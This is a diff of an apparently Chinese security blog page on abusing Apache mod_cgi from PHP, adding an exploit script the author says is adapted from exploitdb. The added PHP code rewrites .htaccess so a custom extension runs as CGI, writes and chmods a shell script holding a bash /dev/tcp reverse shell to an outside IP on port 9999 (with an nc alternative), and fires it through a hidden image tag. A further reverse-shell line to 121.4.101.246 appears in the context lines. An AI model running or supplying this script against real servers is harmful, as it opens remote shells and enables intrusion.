@@ -702,14 +702,14 @@ CGI编程没有特定的语言,C语言,python,li">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        671
+                        1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        2 分
+                        4 分
                     </div>
                     
                 
@@ -757,6 +757,47 @@ bash -i &gt;&amp; /dev/tcp/121.4.101.246/9999 0&gt;&amp;1        //反弹shell�
 <span class="token keyword">echo</span> <span class="token string">"&lt;img src = 'shell.cnm' style = 'display:none;'>"</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>4.访问该php页面，使得cgi脚本执行（直接访问cgi脚本没用，因为还没给它添加执行权限）。</p>
+<p>exploitdb上有一个很好用的poc，我进行了一些个人修改</p>
+<p>mod_cgi.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// $cmd = "nc -c '/bin/bash' 121.4.101.xxx 9999"; //command to be executed</span>
+<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"bash -i >&amp; /dev/tcp/121.4.101.xxx/9999 0>&amp;1"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//command to be executed 有时候环境中有可能没有nc命令，可以多试试其它的命令</span>
+
+<span class="token variable">$shellfile</span> <span class="token operator">=</span> <span class="token string">"#!/bin/bash\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//using a shellscript</span>
+<span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//header is needed, otherwise a 500 error is thrown when there is output</span>
+<span class="token comment" spellcheck="true">//如果直接执行命令则不需要这第二行，但反弹shell需要，否则会500</span>
+<span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"$cmd"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//executing $cmd</span>
+<span class="token keyword">function</span> <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$condition</span><span class="token punctuation">,</span><span class="token variable">$yes</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//this surely can be shorter</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"$text: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$condition</span> <span class="token operator">?</span> <span class="token variable">$yes</span> <span class="token punctuation">:</span> <span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>\n"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'checked'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> <span class="token string">"\nSetEnv HTACCESS on"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Append it to a .htaccess file to see whether .htaccess is allowed</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: '</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'?checked=true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//execute the script again to see if the htaccess test worked</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$modcgi</span> <span class="token operator">=</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'mod_cgi'</span><span class="token punctuation">,</span> <span class="token function">apache_get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// mod_cgi enabled?</span>
+    <span class="token variable">$writable</span> <span class="token operator">=</span> <span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//current dir writable?</span>
+    <span class="token variable">$htaccess</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTACCESS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//htaccess enabled?</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Mod-Cgi enabled"</span><span class="token punctuation">,</span><span class="token variable">$modcgi</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Is writable"</span><span class="token punctuation">,</span><span class="token variable">$writable</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"htaccess working"</span><span class="token punctuation">,</span><span class="token variable">$htaccess</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$modcgi</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$writable</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$htaccess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Error. All of the above must be true for the script to work!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//abort if not</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Backing up .htaccess"</span><span class="token punctuation">,</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">".htaccess"</span><span class="token punctuation">,</span><span class="token string">".htaccess.bak"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Suceeded! Saved in .htaccess.bak"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//make a backup, cause you never know.</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Write .htaccess file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span><span class="token string">"Options +ExecCGI\nAddHandler cgi-script .cnm"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//.dizzle is a nice extension</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Write shell file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'shell.cnm'</span><span class="token punctuation">,</span><span class="token variable">$shellfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//write the file</span>
+        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Chmod 777"</span><span class="token punctuation">,</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"shell.cnm"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//rwx</span>
+        <span class="token keyword">echo</span> <span class="token string">"Executing the script now. Check your listener &lt;img src = 'shell.cnm' style = 'display:none;'>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//call the script</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1115,7 +1156,7 @@ bash -i &gt;&amp; /dev/tcp/121.4.101.246/9999 0&gt;&amp;1        //反弹shell�
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">89.5k</span> 字
+                <span class="white-color">89.8k</span> 字
             
 
             
